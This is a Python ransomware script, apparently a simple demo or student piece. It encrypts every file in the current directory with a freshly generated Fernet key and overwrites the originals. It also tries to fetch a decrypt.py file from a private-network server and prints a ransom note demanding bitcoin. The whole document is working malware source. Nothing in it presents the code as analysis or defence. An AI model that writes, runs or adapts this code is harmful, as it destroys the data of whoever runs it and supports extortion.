import os
from cryptography.fernet import Fernet
from urllib import request

# add all files in directory to files list
files = []
for file in os.listdir():
    if file == 'encrypt.py' or file == 'decrypt.py' or file == 'encryptionKey.key':
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

# generate fernet key
key = Fernet.generate_key()

# write key to a file
with open("encryptionKey.key", 'wb') as file:
    file.write(key)

for file in files:
    with open(file, 'rb') as readFile:
        content = readFile.read()
    with open(file, 'wb') as writeFile:
        encrypted_content = Fernet(key).encrypt(content)
        writeFile.write(encrypted_content)

# retrieve decrypt.py from linux web server
decrypt_py_url = "10.121.189.138/decrypt.py"
request.urlretrieve(decrypt_py_url)

print("YOUR HAVE BEEN AFFECTED WITH RANSOMWARE. ALL OF YOUR FILES HAS BEEN ENCRYPTED. TO HAVE ACCESS BACK, PAY US 1000 BITCOIN IN ADVANCE\nAFTER PAYMENT, YOU WILL BE GIVEN A SECRET KEY TO DECRYPT THE FILE BACK. ENTER THE KEY AT DECRYPT.PY FILE")